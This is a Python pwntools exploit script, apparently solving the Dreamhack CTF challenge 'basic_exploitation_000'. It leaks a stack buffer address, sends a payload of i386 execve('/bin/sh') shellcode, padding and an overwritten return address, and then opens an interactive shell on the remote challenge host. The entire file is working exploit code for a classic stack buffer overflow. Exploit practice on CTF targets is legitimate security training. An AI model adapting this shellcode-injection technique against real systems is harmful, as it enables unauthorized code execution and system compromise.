#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./basic_exploitation_000', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
b *main+37
b *main+50
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 16195)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})


shellcode = asm(
    '''
    mov ebx, 0x68732f6e
    push ebx
    mov ebx, 0x69622f2f
    push ebx
    mov ebx, esp
    inc ebx
    xor ecx, ecx
    xor edx, edx
    xor eax, eax
    mov al, 0x8
    inc eax
    inc eax
    inc eax
    int 0x80
    ''', arch ='i386', os = 'linux')
padding = 0x84
io = start()
io.recvuntil(b'buf = (')
buf = int(io.recvn(10), 16)
success(f"buf @ {hex(buf)}")

payload = shellcode + b'a' * (padding - len(shellcode)) + p32(buf)+ b'\x00'     

sl(payload)

io.interactive()